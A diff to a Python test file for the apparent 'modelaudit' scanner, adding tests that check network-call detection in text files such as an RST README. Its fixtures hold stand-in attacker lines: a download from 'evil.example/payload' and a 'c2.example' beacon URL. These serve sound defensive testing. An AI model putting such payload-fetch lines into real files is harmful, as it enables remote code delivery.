@@ -7,7 +7,7 @@ from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.text_scanner import TextScanner
+from modelaudit.scanners.text_scanner import MAX_DOCUMENTATION_FENCED_CODE_RANGES, TextScanner
 from modelaudit.utils.helpers import cache_decorator
 
 
@@ -195,14 +195,7 @@ beacon_url: https://c2.example/payload
         if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
     }
 
-    assert {
-        "cc_pattern",
-        "ipv4_address",
-        "network_command",
-        "network_function",
-        "network_library",
-        "url_detected",
-    } <= informational_types
+    assert {"domain_name", "url_detected"} <= informational_types
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
 
@@ -766,6 +759,34 @@ def test_text_scanner_earlier_network_library_call_is_not_hidden_by_later_prose(
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_rst_headings_do_not_hide_active_network_call(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.rst"
+    text_path.write_text(
+        """Heading
+~~~~~~~
+download("https://evil.example/payload")
+~~~~~~~
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_range_collection_is_bounded() -> None:
+    payload = b"```python\npass\n```\n" * (MAX_DOCUMENTATION_FENCED_CODE_RANGES + 1)
+
+    assert len(TextScanner._documentation_fenced_code_ranges(payload)) == MAX_DOCUMENTATION_FENCED_CODE_RANGES
 
 
 @pytest.mark.parametrize(
